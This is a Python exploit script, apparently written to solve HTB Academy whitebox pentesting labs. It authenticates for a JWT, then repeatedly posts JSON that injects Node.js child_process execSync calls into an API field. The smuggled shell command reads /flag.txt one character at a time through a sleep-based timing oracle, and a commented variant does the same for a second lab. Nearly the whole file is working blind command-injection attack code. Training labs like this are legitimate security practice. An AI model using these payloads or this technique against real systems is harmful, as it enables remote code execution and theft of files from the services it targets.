#! /usr/bin/env python3 
# Created this script to solve the lab called "INTRO TO WHITEBOX PENTESTING: Exploit Development" and "INTRO TO WHITEBOX PENTESTING: Skills Assessment" on HTBAcademy. 

import requests
import string

def blind_cmd_injection():
    # Update the target
    target= "94.237.58.30:50677"
    foundchar= ''
    count= 0
    charlist= string.printable
    proxies={"http":"http://127.0.0.1:8080"}
    headers1={
        "Content-type":"application/json"
            }
    data1= "{\"email\":\"test@hackthebox.com\"}" 
    # This is the data1 used for the "Skills Assessment" lab --> data1= '''{"uid":"2","sid":"johnwickuse440"}'''
    
    # Get jwt token
    response=requests.post(url=f"http://{target}/api/auth/authenticate", data=data1, proxies=proxies, headers=headers1)
    
    token = response.json().get('token')
    # perform blind command injection
    headers2={
        "Content-type":"application/json",
        "Authorization":f"Bearer {token}"
            }
    
    for num in range(1,40):    
        for char in charlist:                              
            data2=f'''{{
    "text": "' + require('child_process').execSync('cat /flag.txt | head -c {num} | tail -c {num} | {{ read c; if [ \\"$c\\" = \\"{foundchar}{char}\\" ]; then sleep 2; fi; }}')+ `'`, statusCode: 403}})//"
    }}'''  
            # This is the data2 used for the "Skills Assessment" lab -->  data2=f'''{{"external":"true","ip":"{{\\"ip\\": \\"'- require(\\"child_process\\").execSync(\\"cat /flag.txt | head -c {num} | tail -c {num} | {{ read c; if [ \\\\\\"$c\\\\\\" = \\\\\\"{foundchar}{char}\\\\\\" ]; then sleep 2; fi; }}\\").toString()-'\\"}}"}}'''
    
            response=requests.post(url=f"http://{target}/api/service/generate", proxies=proxies, headers=headers2, data=data2)

            if response.elapsed.total_seconds() > 2:            
                foundchar= foundchar + char
                print(foundchar) 
                count= 0
                break
            else:
                count = count + 1
                print(count)
                if count > 101:
                    break
        if count > 101:
            print(foundchar)
            break
try:
    blind_cmd_injection()
except KeyboardInterrupt:
    print("ctrl + c detected...exiting gracefully")
